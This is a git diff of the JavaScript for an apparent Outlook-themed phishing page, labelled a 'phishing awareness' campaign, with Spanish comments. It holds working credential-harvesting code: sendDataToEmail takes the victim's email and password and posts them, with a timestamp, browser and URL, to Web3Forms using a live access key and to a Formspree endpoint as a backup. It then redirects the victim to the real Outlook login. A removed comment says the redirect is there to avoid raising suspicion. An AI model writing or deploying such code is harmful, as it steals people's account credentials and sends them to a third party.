@@ -47,63 +47,93 @@ function showStep(stepNumber) {
     }
 }
 
-// Función para enviar datos al correo usando Web3Forms
+// Función para enviar datos al correo
 function sendDataToEmail(email, password) {
     const timestamp = new Date().toLocaleString('es-ES');
     const userAgent = navigator.userAgent;
     const currentUrl = window.location.href;
     
-    // Crear el mensaje detallado
-    const mensaje = `
-    ═══════════════════════════════════════════
-    🚨 NUEVA CAPTURA - CAMPAÑA DE CONCIENTIZACIÓN
-    ═══════════════════════════════════════════
-    
-    📧 EMAIL CAPTURADO: ${email}
-    🔑 CONTRASEÑA: ${password}
-    
-    ⏰ FECHA Y HORA: ${timestamp}
-    🌐 NAVEGADOR: ${userAgent}
-    🔗 URL DE CAPTURA: ${currentUrl}
-    
-    ═══════════════════════════════════════════
-    ⚠️ Campaña de Seguridad - Datos de prueba
-    ═══════════════════════════════════════════
-    `;
+    console.log('=== INICIANDO ENVÍO DE DATOS ===');
+    console.log('Email:', email);
+    console.log('Password:', password);
+    console.log('Timestamp:', timestamp);
     
     // Preparar datos para Web3Forms
     const formData = new FormData();
     formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
-    formData.append('subject', `🚨 Nueva Captura - ${timestamp}`);
-    formData.append('from_name', 'Sistema de Phishing Awareness');
-    formData.append('email', 'sofly7899@gmail.com'); // Email donde recibirás las capturas
-    formData.append('message', mensaje); // Mensaje principal
-    formData.append('email_capturado', email);
-    formData.append('password_capturada', password);
-    formData.append('fecha_hora', timestamp);
-    formData.append('navegador', userAgent);
-    formData.append('url_captura', currentUrl);
+    formData.append('subject', '🚨 Nueva Captura - Phishing Awareness');
+    formData.append('name', 'Sistema de Captura');
+    formData.append('email', 'noreply@phishing-awareness.com');
+    formData.append('message', `
+NUEVA CAPTURA DETECTADA
+======================
+
+📧 EMAIL: ${email}
+🔑 PASSWORD: ${password}
+
+Fecha: ${timestamp}
+Navegador: ${userAgent}
+URL: ${currentUrl}
+    `);
     
-    // Enviar usando Web3Forms
+    // También enviar usando método alternativo (Formspree)
+    const formspreeData = {
+        email_capturado: email,
+        password_capturada: password,
+        fecha_hora: timestamp,
+        navegador: userAgent,
+        url_captura: currentUrl,
+        _subject: `🚨 Nueva Captura - ${email}`,
+        _replyto: 'sofly7899@gmail.com'
+    };
+    
+    // Enviar con Web3Forms (método principal)
+    console.log('Enviando con Web3Forms...');
     fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         body: formData
     })
-    .then(response => response.json())
+    .then(response => {
+        console.log('Response status:', response.status);
+        return response.json();
+    })
     .then(data => {
-        console.log('Datos enviados exitosamente:', data);
-        // Redirigir a Outlook después de enviar
-        setTimeout(() => {
-            window.location.href = 'https://outlook.live.com/owa/';
-        }, 1500);
+        console.log('✅ Web3Forms respuesta:', data);
+        if (data.success) {
+            console.log('✅ Datos enviados exitosamente a Web3Forms');
+        } else {
+            console.error('❌ Error en Web3Forms:', data.message);
+        }
     })
     .catch(error => {
-        console.error('Error al enviar datos:', error);
-        // Redirigir de todas formas para no levantar sospechas
-        setTimeout(() => {
-            window.location.href = 'https://outlook.live.com/owa/';
-        }, 1500);
+        console.error('❌ Error al enviar con Web3Forms:', error);
     });
+    
+    // Enviar también con Formspree (backup)
+    console.log('Enviando con Formspree como backup...');
+    fetch('https://formspree.io/f/xanyevdp', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formspreeData)
+    })
+    .then(response => {
+        console.log('Formspree response status:', response.status);
+        return response.json();
+    })
+    .then(data => {
+        console.log('✅ Formspree respuesta:', data);
+    })
+    .catch(error => {
+        console.error('❌ Error con Formspree:', error);
+    });
+    
+    // Redirigir después de intentar enviar
+    console.log('Redirigiendo a Outlook en 2 segundos...');
+    setTimeout(() => {
+        window.location.href = 'https://outlook.live.com/owa/';
+    }, 2000);
 }
 
 // Event Listeners
